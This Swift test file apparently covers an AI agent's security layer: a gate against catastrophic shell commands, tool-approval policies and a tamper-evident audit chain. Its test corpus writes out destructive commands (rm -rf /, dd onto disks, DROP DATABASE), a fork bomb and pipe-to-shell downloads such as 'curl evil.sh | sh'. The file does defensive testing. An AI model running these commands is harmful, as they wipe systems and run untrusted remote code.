// FloeSecurityTests — Catastrophic gate corpus, policy matrix, approval
// expiry, audit chain, tamper detection, canonical JSON.

import Foundation
import Testing
@testable import FloeSecurity
@testable import FloeModels
@testable import FloeCore
import FloeTestSupport

// MARK: - Catastrophic corpus

/// Positive cases: every bundled pattern family with at least one command
/// that MUST be stopped.
enum CatastrophicCorpus {
    static let positiveCases: [(command: String, expectedPattern: String)] = [
        ("rm -rf /", "rm-rf-root"),
        ("sudo rm -rf / --no-preserve-root", "rm-rf-root"),
        ("rm -rf /*", "rm-rf-root-star"),
        ("rm -rf ~", "rm-rf-home"),
        ("rm -rf $HOME", "rm-rf-home"),
        ("rm -rf /etc", "rm-rf-system-dirs"),
        ("rm -fr /usr/", "rm-rf-system-dirs"),
        ("dd if=/dev/zero of=/dev/disk0 bs=1m", "dd-block-device"),
        ("dd of=/dev/sda if=image.iso", "dd-block-device"),
        ("mkfs.ext4 /dev/sdb1", "mkfs-block-device"),
        ("mke2fs /dev/nvme0n1", "mkfs-block-device"),
        ("diskutil eraseDisk APFS X /dev/disk2", "diskutil-erase"),
        ("diskutil apfs deleteContainer /dev/disk1s1", "diskutil-erase"),
        ("echo x > /dev/sda", "redirect-block-device"),
        ("shred -vfz /dev/sda", "shred-root"),
        ("srm -rf ~", "shred-root"),
        ("chmod -R 000 /", "chmod-root-000"),
        ("chown -R nobody /", "chown-root-recursive"),
        ("mv ~ /dev/null", "mv-to-null"),
        ("mv / /dev/null", "mv-to-null"),
        ("find / -name '*.tmp' -delete", "find-delete-root"),
        ("git clean -fdx", "git-clean-home"),
        ("DROP DATABASE production", "sql-drop-database"),
        ("drop table users", "sql-drop-table-no-where"),
        ("TRUNCATE TABLE events", "sql-truncate"),
        ("fdisk /dev/disk0", "partition-tool"),
        ("parted /dev/sda mklabel gpt", "partition-tool"),
        ("zfs destroy -r tank/data", "zfs-destroy"),
        ("btrfs subvolume delete /", "btrfs-subvolume-delete-root")
    ]

    /// Negative cases: commands that MUST NOT be stopped.
    static let negativeCases: [String] = [
        "rm -rf ./build",
        "rm -rf /tmp/scratch",
        "rm -rf node_modules",
        "rm file.txt",
        "dd if=image.img of=backup.img",
        "dd of=image.img if=/dev/zero bs=1m count=10",
        "mkfs --help",
        "diskutil list",
        "diskutil info /dev/disk0",
        "echo hello > /tmp/out.txt",
        "chmod -R 755 ./dist",
        "chmod 000 ./secret.txt",
        "chown -R user:staff ./project",
        "mv ~/Downloads/file /tmp",
        "find . -name '*.log' -delete",
        "find /tmp -delete",
        "git clean -fd",
        "git clean -fd ./subdir",
        "git status",
        "sqlite3 app.db 'drop index idx_old'",
        "kill -9 1234",
        "killall Finder",
        "kill -9 -1",
        "launchctl unload ~/Library/LaunchAgents/agent.plist",
        "launchctl unload /System/Library/LaunchDaemons/sshd.plist",
        "curl https://example.com/file.tar.gz -o file.tar.gz",
        "curl -s https://api.example.com | jq .",
        "wget https://example.com/setup.sh",
        "curl https://example.com/install.sh | sh",
        "defaults delete com.example.app",
        "defaults write -g KeyRepeat -int 2",
        "csrutil status",
        "csrutil disable",
        "shutdown -h +60",
        "shutdown -h now",
        "reboot",
        ":(){ :|:& };:",
        "ls /",
        "cat /etc/hosts",
        "sudo ls /var/root",
        "npm run build",
        "xcodebuild -scheme App clean",
        "tar -czf backup.tar.gz ~",
        "rsync -av ~/Documents /Volumes/Backup",
        "docker system prune",
        "brew uninstall wget",
        "pip install requests"
    ]
}

@Suite("FloeSecurity.CatastrophicGate")
struct CatastrophicGateTests {

    private func makeGate() throws -> CatastrophicActionGate {
        try CatastrophicActionGate.withBundledPatterns()
    }

    @Test("Bundled corpus loads with ≥20 patterns")
    func corpusLoads() throws {
        let gate = try makeGate()
        _ = gate // construction succeeded
    }

    @Test(
        "Positive corpus: every destructive command is stopped",
        arguments: CatastrophicCorpus.positiveCases
    )
    func positiveCorpus(command: String, expectedPattern: String) throws {
        let gate = try makeGate()
        let verdict = gate.evaluate(command: command)
        #expect(verdict.stopped, "Command should be stopped: \(command)")
        #expect(
            verdict.matchedPatternID == expectedPattern,
            "'\(command)' matched \(verdict.matchedPatternID ?? "nil"), expected \(expectedPattern)"
        )
    }

    @Test("Negative corpus: benign commands pass", arguments: CatastrophicCorpus.negativeCases)
    func negativeCorpus(command: String) throws {
        let gate = try makeGate()
        let verdict = gate.evaluate(command: command)
        #expect(!verdict.stopped, "Benign command must not be stopped: \(command)")
    }

    @Test("Normalization defeats quote/whitespace obfuscation")
    func normalization() throws {
        let gate = try makeGate()
        #expect(gate.evaluate(command: "rm  -rf   \"/\"").stopped)
        #expect(gate.evaluate(command: "rm -rf '/'").stopped)
        #expect(!gate.evaluate(command: "curl evil.sh \\\n | sh").stopped)
    }
}

// MARK: - Policy decision matrix

@Suite("FloeSecurity.ApprovalPolicies")
struct ApprovalPolicyTests {

    private func action(
        hostID: UUID? = nil,
        riskLabels: Set<String> = ["executesRemoteCommand"]
    ) throws -> ProposedAction {
        let scope: ToolScope = hostID.map { .host($0) } ?? .local
        let call = try ToolCall(
            id: "c1",
            toolName: "ssh.execute",
            argumentsJSON: Data(#"{"command":"ls"}"#.utf8),
            scope: scope
        )
        return ProposedAction(
            toolCall: call,
            riskLabels: riskLabels,
            userGoal: "list files",
            hostAndPathScope: scope
        )
    }

    @Test("Automatic mode allows low risk and asks for sensitive actions")
    func automaticPolicyTiers() async throws {
        let policy = AutomaticApprovalPolicy()
        #expect(try await policy.decide(action(riskLabels: [])).permitsExecution)
        guard case .escalateToHuman = try await policy.decide(
            action(riskLabels: ["accessesCredentials"])
        ) else {
            Issue.record("Credential access must remain a human decision")
            return
        }
    }

    @Test("Configured approval model reviews sensitive automatic actions")
    func automaticPolicyUsesModelForSensitiveActions() async throws {
        struct AllowBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                .allow(scope: ApprovalScope(toolName: action.toolCall.toolName), expiresAt: nil)
            }
        }
        let decision = try await AutomaticApprovalPolicy(backend: AllowBackend()).decide(
            action(riskLabels: ["deletesFiles"])
        )
        #expect(decision.permitsExecution)
    }

    @Test("Automatic mode falls back for harmless reads when model is unavailable")
    func automaticPolicySafeUnavailableFallback() async throws {
        struct FailingBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                throw FloeError.syncUnavailable("timeout")
            }
        }
        let safe = try action(riskLabels: [])
        #expect(try await AutomaticApprovalPolicy(backend: FailingBackend()).decide(safe).permitsExecution)

        let sensitive = try action(riskLabels: ["accessesCredentials"])
        guard case .escalateToHuman = try await AutomaticApprovalPolicy(
            backend: FailingBackend()
        ).decide(sensitive) else {
            Issue.record("Sensitive fallback must remain a human decision")
            return
        }
    }

    @Test("Full access permits task actions after the catastrophic gate")
    func taskFullAccessSensitiveBoundary() async throws {
        let policy = TaskFullAccessPolicy()
        #expect(try await policy.decide(action()).permitsExecution)
        for risk in [
            "deletesFiles", "accessesCredentials", "sendsDataToProvider",
            "persistsPersonalData", "changesAgentBehavior"
        ] {
            #expect(try await policy.decide(action(riskLabels: [risk])).permitsExecution)
        }
    }

    @Test("Sandbox Python runs automatically but package installs require review")
    func localPythonReviewBoundary() async throws {
        struct AllowBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                .allow(scope: ApprovalScope(toolName: action.toolCall.toolName), expiresAt: nil)
            }
        }
        func pythonAction(_ arguments: String) throws -> ProposedAction {
            let call = try ToolCall(
                id: "python",
                toolName: "exec.localPython",
                argumentsJSON: Data(arguments.utf8),
                scope: .local
            )
            return ProposedAction(
                toolCall: call,
                riskLabels: ["executesLocalCode"],
                userGoal: "analyze data",
                hostAndPathScope: .local
            )
        }
        #expect(try await AutomaticApprovalPolicy().decide(
            pythonAction(#"{"script":"print(1)"}"#)
        ).permitsExecution)
        #expect(try await AutomaticApprovalPolicy(backend: AllowBackend()).decide(
            pythonAction(#"{"script":"print(1)"}"#)
        ).permitsExecution)
        guard case .escalateToHuman = try await AutomaticApprovalPolicy().decide(
            pythonAction(#"{"script":"import requests","packages":["requests==2.32.4"]}"#)
        ) else {
            Issue.record("Package install without a review model must escalate")
            return
        }
        #expect(try await AutomaticApprovalPolicy(packageReviewBackend: AllowBackend()).decide(
            pythonAction(#"{"script":"import requests","packages":["requests==2.32.4"]}"#)
        ).permitsExecution)
        guard case .escalateToHuman = try await AutomaticApprovalPolicy().decide(
            pythonAction(#"{"script":"import marko","pipCommand":"pip install marko==2.2.0","packagePurpose":"Render requested Markdown","packageCapabilities":["document.render"]}"#)
        ) else {
            Issue.record("Declarative pip install without a review model must escalate")
            return
        }
        #expect(try await AutomaticApprovalPolicy(packageReviewBackend: AllowBackend()).decide(
            pythonAction(#"{"script":"import marko","pipCommand":"pip install marko==2.2.0","packagePurpose":"Render requested Markdown","packageCapabilities":["document.render"]}"#)
        ).permitsExecution)
    }

    @Test("HumanApprovalPolicy always escalates")
    func humanPolicy() async throws {
        let policy = HumanApprovalPolicy()
        let decision = try await policy.decide(action())
        guard case .escalateToHuman = decision else {
            Issue.record("Expected escalateToHuman, got \(decision)")
            return
        }
    }

    @Test("Bounded Git work is automatic and one publication request is not reviewed repeatedly")
    func gitApprovalExemptions() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .deny(reason: "unexpected review")
            }
            func callCount() -> Int { calls }
        }
        let backend = Backend()
        let policy = AutomaticApprovalPolicy(backend: backend)
        for name in [
            "git.status", "git.diff", "git.initialize", "git.stage", "git.commit",
            "git.pull", "github.clone", "cloudWorkspace.gitCommit"
        ] {
            let call = try ToolCall(id: name, toolName: name, argumentsJSON: Data(#"{}"#.utf8), scope: .local)
            let proposed = ProposedAction(
                toolCall: call,
                riskLabels: ["writesFiles", "executesRemoteCommand"],
                userGoal: "维护这个项目",
                hostAndPathScope: .local
            )
            #expect(try await policy.decide(proposed).permitsExecution)
        }

        let push = try ToolCall(id: "push", toolName: "git.push", argumentsJSON: Data(#"{}"#.utf8), scope: .local)
        #expect(try await policy.decide(ProposedAction(
            toolCall: push,
            riskLabels: ["modifiesRemoteSystem", "accessesCredentials"],
            userGoal: "修复后推送 main 并发布",
            hostAndPathScope: .local
        )).permitsExecution)
        #expect(await backend.callCount() == 0)

        #expect(!(try await policy.decide(ProposedAction(
            toolCall: push,
            riskLabels: ["modifiesRemoteSystem"],
            userGoal: "不要推送，只检查",
            hostAndPathScope: .local
        )).permitsExecution))
        #expect(await backend.callCount() == 1)
    }

    @Test("LAN discovery never invokes the approval model")
    func lanDiscoveryApprovalExemption() async throws {
        struct FailingBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                Issue.record("network.scanLAN must not reach the approval model")
                throw FloeError.syncUnavailable("unexpected review")
            }
        }
        let call = try ToolCall(
            id: "lan-scan",
            toolName: "network.scanLAN",
            argumentsJSON: Data(#"{"timeoutSeconds":5}"#.utf8),
            scope: .local
        )
        let action = ProposedAction(
            toolCall: call,
            riskLabels: ["networkAccess"],
            userGoal: "扫描局域网设备",
            hostAndPathScope: .local
        )
        let policy = AutomaticApprovalPolicy(backend: FailingBackend())
        #expect(!policy.requiresModelReview(action))
        #expect(try await policy.decide(action).permitsExecution)
    }

    @Test("Read-only Apple capability tools never invoke the approval model")
    func appleReadApprovalExemptions() async throws {
        struct FailingBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                Issue.record("Read-only Apple tools must not reach the approval model")
                throw FloeError.syncUnavailable("unexpected review")
            }
        }
        let policy = AutomaticApprovalPolicy(backend: FailingBackend())
        for name in [
            "apple.calendar.list", "apple.reminders.list", "apple.maps.search",
            "apple.home.list", "apple.watch.status", "apple.location.current",
            "apple.automation.list"
        ] {
            let call = try ToolCall(
                id: name,
                toolName: name,
                argumentsJSON: Data(#"{}"#.utf8),
                scope: .local
            )
            let proposed = ProposedAction(
                toolCall: call,
                riskLabels: ["readsPersonalData"],
                userGoal: "查看 Apple 能力",
                hostAndPathScope: .local
            )
            #expect(!policy.requiresModelReview(proposed))
            #expect(try await policy.decide(proposed).permitsExecution)
        }
    }

    @Test("Broad tool-test goals authorize routine diagnostics but not sensitive actions")
    func broadToolTestAuthorization() async throws {
        struct FailingBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                throw FloeError.syncUnavailable("approval backend should be bypassed")
            }
        }
        func proposed(tool: String, risks: Set<String>) throws -> ProposedAction {
            let call = try ToolCall(
                id: tool,
                toolName: tool,
                argumentsJSON: Data("{}".utf8),
                scope: .local
            )
            return ProposedAction(
                toolCall: call,
                riskLabels: risks,
                userGoal: "帮我测试一下所有的工具",
                hostAndPathScope: .local
            )
        }
        let policy = AutomaticApprovalPolicy(backend: FailingBackend())
        for (tool, risks) in [
            ("diagnostic.networkProbe", Set(["networkAccess"])),
            ("diagnostic.workspaceFixture", Set(["writesFiles"])),
            ("diagnostic.sandbox", Set(["executesLocalCode"]))
        ] {
            let action = try proposed(tool: tool, risks: risks)
            #expect(!policy.requiresModelReview(action))
            #expect(try await policy.decide(action).permitsExecution)
        }

        for risks in [
            Set(["deletesFiles"]),
            Set(["executesRemoteCommand"]),
            Set(["accessesCredentials"]),
            Set(["modifiesRemoteSystem"])
        ] {
            let action = try proposed(tool: "diagnostic.sensitive", risks: risks)
            #expect(policy.requiresModelReview(action))
            guard case .escalateToHuman = try await policy.decide(action) else {
                Issue.record("Sensitive diagnostic actions must remain reviewable")
                continue
            }
        }
    }

    @Test("SSH inspection and bootstrap planning bypass redundant review")
    func sshReadOnlyBootstrapExemptions() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .deny(reason: "unexpected review")
            }
            func callCount() -> Int { calls }
        }
        let backend = Backend()
        let policy = AutomaticApprovalPolicy(backend: backend)
        for (name, arguments) in [
            ("ssh.listHosts", #"{}"#),
            ("ssh.inspectTarget", #"{}"#),
            ("ssh.bootstrapExecutionHost", #"{"apply":false}"#),
            ("ssh.bootstrapFloeRemoteAgent", #"{"operation":"check"}"#)
        ] {
            let call = try ToolCall(
                id: name,
                toolName: name,
                argumentsJSON: Data(arguments.utf8),
                scope: .host(UUID())
            )
            let action = ProposedAction(
                toolCall: call,
                riskLabels: ["executesRemoteCommand", "modifiesRemoteSystem"],
                userGoal: "检查远程环境",
                hostAndPathScope: call.scope
            )
            #expect(try await policy.decide(action).permitsExecution)
        }
        #expect(await backend.callCount() == 0)
    }

    @Test("Explicit Docker bootstrap authorization is not requested twice")
    func sshBootstrapExplicitAuthorization() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .escalateToHuman(reason: "unexpected review")
            }
            func callCount() -> Int { calls }
        }
        let backend = Backend()
        let hostID = UUID()
        func decision(goal: String) async throws -> ApprovalDecision {
            let call = try ToolCall(
                id: UUID().uuidString,
                toolName: "ssh.bootstrapExecutionHost",
                argumentsJSON: Data(#"{"apply":true,"installContainerRuntime":true}"#.utf8),
                scope: .host(hostID)
            )
            return try await AutomaticApprovalPolicy(backend: backend).decide(ProposedAction(
                toolCall: call,
                riskLabels: ["executesRemoteCommand", "modifiesRemoteSystem"],
                userGoal: goal,
                hostAndPathScope: call.scope
            ))
        }
        #expect(try await decision(goal: "我同意安装 Docker").permitsExecution)
        #expect(await backend.callCount() == 0)
        #expect(!(try await decision(goal: "不要安装 Docker").permitsExecution))
        #expect(await backend.callCount() == 1)
    }

    @Test("Explicit tool testing authorizes disposable SSH commands without repeated review")
    func sandboxedSSHDiagnosticAuthorization() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .deny(reason: "unexpected review")
            }
            func callCount() -> Int { calls }
        }
        let backend = Backend()
        let hostID = UUID()
        func proposed(
            mode: String?,
            goal: String,
            command: String = "printf container-ok && uname -a"
        ) throws -> ProposedAction {
            var object: [String: Any] = [
                "command": command,
                "hostID": hostID.uuidString
            ]
            if let mode { object["executionMode"] = mode }
            let arguments = try JSONSerialization.data(withJSONObject: object)
            let call = try ToolCall(
                id: UUID().uuidString,
                toolName: "ssh.execute",
                argumentsJSON: arguments,
                scope: .host(hostID)
            )
            return ProposedAction(
                toolCall: call,
                riskLabels: ["executesRemoteCommand", "networkAccess"],
                userGoal: goal,
                hostAndPathScope: call.scope
            )
        }

        let policy = AutomaticApprovalPolicy(backend: backend)
        #expect(try await policy.decide(proposed(
            mode: nil,
            goal: "帮我测试一下所有的工具，包括远程容器"
        )).permitsExecution)
        #expect(try await policy.decide(proposed(
            mode: "container",
            goal: "准备远程执行环境"
        )).permitsExecution)
        #expect(await backend.callCount() == 0)

        #expect(!(try await policy.decide(proposed(
            mode: "host",
            goal: "帮我测试一下所有的工具"
        )).permitsExecution))
        #expect(try await policy.decide(proposed(
            mode: "host",
            goal: "帮我安装并配置 VNC 环境",
            command: "apt-get update && apt-get install -y tigervnc-standalone-server"
        )).permitsExecution)
        #expect(try await policy.decide(proposed(
            mode: "host",
            goal: "修复环境，清理旧的任务目录后重新安装",
            command: "rm -rf /tmp/floe-vnc-stage && mkdir -p /tmp/floe-vnc-stage"
        )).permitsExecution)
        #expect(!(try await policy.decide(proposed(
            mode: nil,
            goal: "准备远程执行环境",
            command: "apt-get install -y git"
        )).permitsExecution))
        #expect(!(try await policy.decide(proposed(
            mode: "container",
            goal: "不要执行测试"
        )).permitsExecution))
        #expect(await backend.callCount() == 3)
    }

    @Test("Bounded local inspection and presentation bypass the approval model")
    func builtInInspectionExemptions() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .deny(reason: "must not be called")
            }
        }
        let backend = Backend()
        let policy = AutomaticApprovalPolicy(backend: backend)
        for name in [
            "image.inspect", "image.ocr", "image.generate",
            "document.pdf.inspect", "document.pdf.render",
            "exec.localNumerical", "presentation.create"
        ] {
            let call = try ToolCall(
                id: name,
                toolName: name,
                argumentsJSON: Data(#"{"path":"sample.pdf"}"#.utf8),
                scope: .local
            )
            let action = ProposedAction(
                toolCall: call,
                riskLabels: ["readsFiles", "sendsDataToProvider"],
                userGoal: "inspect the attachment",
                hostAndPathScope: .local
            )
            #expect(try await policy.decide(action).permitsExecution)
            #expect(!policy.requiresModelReview(action))
        }

        let svgInspect = try ToolCall(
            id: "svg-inspect",
            toolName: "image.svgDocument",
            argumentsJSON: Data(#"{"operation":"inspect","path":"sample.svg"}"#.utf8),
            scope: .local
        )
        let svgAction = ProposedAction(
            toolCall: svgInspect,
            riskLabels: ["readsFiles"],
            userGoal: "inspect the SVG",
            hostAndPathScope: .local
        )
        #expect(try await policy.decide(svgAction).permitsExecution)
        #expect(!policy.requiresModelReview(svgAction))
        #expect(await backend.calls == 0)
    }

    @Test("Bounded font inspection and install bypass review, removal does not")
    func fontApprovalBoundary() async throws {
        actor Backend: ModelApprovalPolicy.DecisionBackend {
            private(set) var calls = 0
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                calls += 1
                return .escalateToHuman(reason: "destructive font change")
            }
            func callCount() -> Int { calls }
        }
        let backend = Backend()
        let policy = AutomaticApprovalPolicy(backend: backend)
        for name in ["font.list", "font.install"] {
            let call = try ToolCall(
                id: name,
                toolName: name,
                argumentsJSON: Data(#"{}"#.utf8),
                scope: .local
            )
            let action = ProposedAction(
                toolCall: call,
                riskLabels: ["networkAccess", "writesFiles"],
                userGoal: "文档缺字体时自动下载并安装",
                hostAndPathScope: .local
            )
            #expect(!policy.requiresModelReview(action))
            #expect(try await policy.decide(action).permitsExecution)
        }

        let removeCall = try ToolCall(
            id: "font.remove",
            toolName: "font.remove",
            argumentsJSON: Data(#"{"id":"font"}"#.utf8),
            scope: .local
        )
        let removal = ProposedAction(
            toolCall: removeCall,
            riskLabels: ["deletesFiles"],
            userGoal: "处理字体",
            hostAndPathScope: .local
        )
        #expect(policy.requiresModelReview(removal))
        #expect(!(try await policy.decide(removal).permitsExecution))
        #expect(await backend.callCount() == 1)
    }

    @Test("ModelApprovalPolicy fail-closed on backend error")
    func modelPolicyFailClosed() async throws {
        struct FailingBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                throw FloeError.internalError("model exploded")
            }
        }
        let policy = ModelApprovalPolicy(backend: FailingBackend())
        let decision = try await policy.decide(action())
        guard case .escalateToHuman = decision else {
            Issue.record("Expected fail-closed escalate, got \(decision)")
            return
        }
    }

    @Test("ModelApprovalPolicy passes through backend allow/deny")
    func modelPolicyPassthrough() async throws {
        struct AllowBackend: ModelApprovalPolicy.DecisionBackend {
            func decide(_ action: ProposedAction) async throws -> ApprovalDecision {
                .allow(scope: ApprovalScope(toolName: action.toolCall.toolName), expiresAt: nil)
            }
        }
        let policy = ModelApprovalPolicy(backend: AllowBackend())
        let decision = try await policy.decide(action())
        #expect(decision.permitsExecution)
    }

    @Test("FullControlPolicy allows only the granted host")
    func fullControlScope() async throws {
        let hostA = UUID()
        let hostB = UUID()
        let policy = FullControlPolicy(grant: FullControlPolicy.Grant(
            hostID: hostA,
            expiresAt: Date().addingTimeInterval(1800)
        ))
        let onHost = try await policy.decide(action(hostID: hostA))
        #expect(onHost.permitsExecution)
        let offHost = try await policy.decide(action(hostID: hostB))
        guard case .escalateToHuman = offHost else {
            Issue.record("Cross-host action must escalate")
            return
        }
    }

    @Test("FullControlPolicy expires by wall clock")
    func fullControlExpiry() async throws {
        let policy = FullControlPolicy(grant: FullControlPolicy.Grant(
            hostID: UUID(),
            expiresAt: Date().addingTimeInterval(-1) // already expired
        ))
        let decision = try await policy.decide(action(hostID: UUID()))
        guard case .escalateToHuman(let reason) = decision else {
            Issue.record("Expired grant must escalate")
            return
        }
        #expect(reason.contains("expired"))
    }

    @Test("ApprovalGrant expiry boundary")
    func grantExpiry() {
        let expiry = Date().addingTimeInterval(60)
        let grant = ApprovalGrant(
            scope: ApprovalScope(toolName: "t"),
            expiresAt: expiry,
            policyName: "human"
        )
        #expect(!grant.isExpired(at: expiry.addingTimeInterval(-1)))
        #expect(grant.isExpired(at: expiry))
        #expect(grant.isExpired(at: expiry.addingTimeInterval(1)))
        let noExpiry = ApprovalGrant(
            scope: ApprovalScope(toolName: "t"),
            expiresAt: nil,
            policyName: "human"
        )
        #expect(!noExpiry.isExpired())
    }
}

// MARK: - ApprovalGrantStore

@Suite("FloeSecurity.ApprovalGrantStore")
struct ApprovalGrantStoreTests {

    @Test("Single-use grants burn after consumption")
    func singleUseBurn() async {
        let store = ApprovalGrantStore()
        let grant = ApprovalGrant(
            scope: ApprovalScope(toolName: "t", singleUse: true),
            expiresAt: nil,
            policyName: "human"
        )
        await store.add(grant)
        #expect(await store.grant(id: grant.id) != nil)
        await store.consumeIfSingleUse(grant)
        #expect(await store.grant(id: grant.id) == nil)
    }

    @Test("Expired grants purge")
    func purgeExpired() async {
        let store = ApprovalGrantStore()
        let expired = ApprovalGrant(
            scope: ApprovalScope(toolName: "t"),
            expiresAt: Date().addingTimeInterval(-10),
            policyName: "human"
        )
        let live = ApprovalGrant(
            scope: ApprovalScope(toolName: "u"),
            expiresAt: Date().addingTimeInterval(600),
            policyName: "human"
        )
        await store.add(expired)
        await store.add(live)
        let purged = await store.purgeExpired()
        #expect(purged == 1)
        #expect(await store.grant(id: live.id) != nil)
        #expect(await store.grant(id: expired.id) == nil)
    }
}

// MARK: - Audit chain

@Suite("FloeSecurity.AuditChain")
struct AuditChainTests {

    private func draft(sequence _: Int64 = 0, runID: UUID) -> AuditEntry {
        AuditEntry(
            sequence: 0,
            timestamp: Date(timeIntervalSince1970: 1_700_000_000),
            runID: runID,
            modelRemoteID: "test-model-1",
            toolName: "ssh.execute",
            target: "host:test",
            policyUsed: "human",
            decision: "allow:human",
            exitStatus: 0,
            outputDigestSHA256: "abc123",
            prevHashSHA256: "",
            entryHashSHA256: ""
        )
    }

    @Test("Append assigns sequence, prevHash, entryHash")
    func appendComputesHashes() async throws {
        let chain = AuditChain(deviceSecret: TestFixtures.testDeviceSecret)
        let runID = UUID()
        let first = try await chain.append(draft(runID: runID))
        #expect(first.sequence == 1)
        #expect(first.prevHashSHA256 == AuditEntry.genesisPrevHash)
        #expect(first.entryHashSHA256.count == 64)
        let second = try await chain.append(draft(runID: runID))
        #expect(second.sequence == 2)
        #expect(second.prevHashSHA256 == first.entryHashSHA256)
        #expect(await chain.verify() == nil)
    }

    @Test("1000-entry chain constructs and verifies")
    func thousandEntryChain() async throws {
        let chain = AuditChain(deviceSecret: TestFixtures.testDeviceSecret)
        let runID = UUID()
        for _ in 0..<1000 {
            _ = try await chain.append(draft(runID: runID))
        }
        #expect(await chain.count == 1000)
        #expect(await chain.verify() == nil)
    }

    @Test("Tampering with any field breaks verification at that sequence")
    func tamperDetection() async throws {
        let chain = AuditChain(deviceSecret: TestFixtures.testDeviceSecret)
        let runID = UUID()
        for _ in 0..<10 {
            _ = try await chain.append(draft(runID: runID))
        }
        var entries = await chain.allEntries
        entries[4].decision = "allow:attacker" // tamper
        let deviceKey = AuditDeviceKey.derive(deviceSecret: TestFixtures.testDeviceSecret)
        let firstTamper = AuditChain.verifyChain(entries, deviceKey: deviceKey)
        #expect(firstTamper == 5)
    }

    @Test("Wrong device key fails verification")
    func wrongDeviceKey() async throws {
        let chain = AuditChain(deviceSecret: TestFixtures.testDeviceSecret)
        _ = try await chain.append(draft(runID: UUID()))
        let entries = await chain.allEntries
        let wrongKey = AuditDeviceKey.derive(deviceSecret: Data("wrong-secret".utf8))
        #expect(AuditChain.verifyChain(entries, deviceKey: wrongKey) == 1)
    }

    @Test("Sequence gap is detected")
    func sequenceGapDetected() async throws {
        let chain = AuditChain(deviceSecret: TestFixtures.testDeviceSecret)
        let runID = UUID()
        for _ in 0..<5 {
            _ = try await chain.append(draft(runID: runID))
        }
        var entries = await chain.allEntries
        entries.remove(at: 2) // delete entry 3 → gap
        let deviceKey = AuditDeviceKey.derive(deviceSecret: TestFixtures.testDeviceSecret)
        #expect(AuditChain.verifyChain(entries, deviceKey: deviceKey) != nil)
    }

    @Test("HKDF derivation is deterministic and key-sensitive")
    func hkdfDeterministic() {
        let keyA = AuditDeviceKey.derive(deviceSecret: Data("secret-a".utf8))
        let keyB = AuditDeviceKey.derive(deviceSecret: Data("secret-a".utf8))
        let keyC = AuditDeviceKey.derive(deviceSecret: Data("secret-b".utf8))
        #expect(keyA == keyB)
        #expect(keyA != keyC)
    }
}

// MARK: - Canonical JSON

@Suite("FloeSecurity.CanonicalJSON")
struct CanonicalJSONTests {

    private struct Nested: Codable {
        var zeta: Int
        var alpha: String
        var mid: [Int]
    }

    @Test("Keys serialize sorted by code point, no whitespace")
    func sortedKeysNoWhitespace() throws {
        let encoder = CanonicalJSONEncoder()
        let data = try encoder.encode(Nested(zeta: 1, alpha: "a", mid: [3, 2]))
        let text = String(decoding: data, as: UTF8.self)
        #expect(text == #"{"alpha":"a","mid":[3,2],"zeta":1}"#)
    }

    @Test("Dates serialize as UTC ISO-8601 millis")
    func dateSerialization() throws {
        struct WithDate: Codable { var at: Date }
        let encoder = CanonicalJSONEncoder()
        let data = try encoder.encode(WithDate(at: Date(timeIntervalSince1970: 1_700_000_000.5)))
        #expect(String(decoding: data, as: UTF8.self) == #"{"at":"2023-11-14T22:13:20.500Z"}"#)
    }

    @Test("Strings normalize to NFC")
    func nfcNormalization() throws {
        struct WithString: Codable { var s: String }
        let encoder = CanonicalJSONEncoder()
        // e + combining acute (NFD) → é (NFC)
        let nfd = "e\u{0301}"
        let data = try encoder.encode(WithString(s: nfd))
        #expect(String(decoding: data, as: UTF8.self) == #"{"s":"é"}"#)
    }

    @Test("Data serializes as lowercase hex")
    func dataAsHex() throws {
        struct WithData: Codable { var blob: Data }
        let encoder = CanonicalJSONEncoder()
        let data = try encoder.encode(WithData(blob: Data([0xDE, 0xAD, 0xBE, 0xEF])))
        #expect(String(decoding: data, as: UTF8.self) == #"{"blob":"deadbeef"}"#)
    }

    @Test("Encoding is deterministic across 100 fuzz structures")
    func fuzzDeterminism() throws {
        struct Fuzz: Codable {
            var numbers: [Int]
            var flag: Bool
            var note: String
        }
        let encoder = CanonicalJSONEncoder()
        var rng: UInt64 = 0xDEADBEEF
        func nextRandom() -> UInt64 {
            rng = rng &* 6364136223846793005 &+ 1442695040888963407
            return rng >> 11
        }
        for _ in 0..<100 {
            let value = Fuzz(
                numbers: (0..<Int(nextRandom() % 8)).map { _ in Int(bitPattern: UInt(nextRandom())) },
                flag: nextRandom() % 2 == 0,
                note: "s\(nextRandom())"
            )
            let first = try encoder.encode(value)
            let second = try encoder.encode(value)
            #expect(first == second)
        }
    }

    @Test("Same logical entry encodes identically regardless of key order in source")
    func keyOrderIndependence() throws {
        struct AB: Codable { var a: Int; var b: Int }
        struct BA: Codable { var b: Int; var a: Int }
        let encoder = CanonicalJSONEncoder()
        let ab = try encoder.encode(AB(a: 1, b: 2))
        let ba = try encoder.encode(BA(b: 2, a: 1))
        #expect(ab == ba)
    }
}
